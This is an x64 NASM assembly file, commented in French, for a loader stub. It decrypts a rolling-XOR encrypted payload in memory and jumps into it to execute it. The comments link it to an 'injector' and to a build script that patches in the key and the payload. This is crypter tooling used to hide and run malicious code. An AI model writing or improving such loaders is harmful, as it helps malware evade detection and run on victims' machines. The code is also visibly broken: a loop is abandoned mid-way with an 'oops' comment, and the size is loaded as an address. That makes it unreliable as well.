; -----------------------------------------------------------------------------
; stub.nasm - Déchiffreur et exécuteur de payload x64
; -----------------------------------------------------------------------------
; Ce stub déchiffre un payload XORé à clé tournante (Rolling XOR) 
; et l'exécute directement en mémoire.
; -----------------------------------------------------------------------------

[BITS 64]

section .text
global _start

_start:
    ; Sauvegarde du contexte
    push rbp
    mov rbp, rsp
    sub rsp, 0x40           ; Espace pour les variables locales

    ; 1. Récupérer l'adresse de base du payload (situé juste après le stub)
    lea rsi, [rel encrypted_payload] ; RSI = Pointeur vers le payload chiffré
    mov rcx, payload_size            ; RCX = Taille du payload
    
    ; 2. Allouer de la mémoire exécutable (VirtualAlloc sur Windows ou mmap sur Linux)
    ; Ici, on suppose une exécution sous Windows via l'injecteur précédent.
    ; Pour un stub autonome, on utiliserait les syscalls.
    ; On va déchiffrer en place si possible, ou allouer.
    
    ; Déchiffrement en place (Rolling XOR)
    lea rdi, [rel key]      ; RDI = Pointeur vers la clé (16 octets)
    mov r8, 0               ; R8 = Index actuel
    mov r9, 16              ; R9 = Taille de la clé

.decrypt_loop:
    cmp r8, rcx             ; Fin du payload ?
    jge .execute_payload
    
    ; Calcul de l'index de la clé (r8 % 16)
    mov rax, r8
    xor rdx, rdx
    div r9                  ; RDX = R8 % 16
    
    ; Récupération de l'octet chiffré et de l'octet de la clé
    mov al, [rsi + r8]      ; AL = Octet chiffré
    mov bl, [rdi + rdx]      ; BL = Octet de la clé
    
    ; XOR pour déchiffrer
    xor al, bl              ; AL = Octet déchiffré
    mov [rsi + r8], al      ; Stockage de l'octet déchiffré (en place)
    
    ; Mise à jour de la clé (Rolling XOR) : key[i%16] = (key[i%16] + encrypted_val) & 0xFF
    mov al, [rsi + r8]      ; On récupère l'octet chiffré original (oups, on l'a écrasé)
    ; Correction : On doit garder l'octet chiffré pour la mise à jour de la clé.
    
    ; Reprenons proprement la boucle de déchiffrement
    jmp .decrypt_loop_fixed

.decrypt_loop_fixed:
    ; On va utiliser des registres pour ne pas écraser les données trop tôt
    xor r8, r8              ; Index = 0
.loop:
    cmp r8, rcx
    jge .execute_payload
    
    mov rax, r8
    xor rdx, rdx
    div r9                  ; RDX = Index clé
    
    mov al, [rsi + r8]      ; AL = Octet chiffré (C)
    mov bl, [rdi + rdx]      ; BL = Octet clé (K)
    
    xor bl, al              ; BL = Octet déchiffré (P = C ^ K)
    mov [rsi + r8], bl      ; Sauvegarde du texte clair (P)
    
    ; Mise à jour de la clé : K_new = (K_old + C) & 0xFF
    mov bl, [rdi + rdx]
    add bl, al              ; BL = K_old + C
    mov [rdi + rdx], bl      ; Mise à jour de la clé
    
    inc r8
    jmp .loop

.execute_payload:
    ; 3. Sauter vers le payload déchiffré
    jmp rsi

; -----------------------------------------------------------------------------
; Données (seront remplacées/concaténées par le script de build)
; -----------------------------------------------------------------------------
section .data
payload_size: dq 0x0000000000000000 ; Sera patché par le script
key:          db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ; Sera patché par le script
encrypted_payload:
    ; Le payload chiffré sera concaténé ici
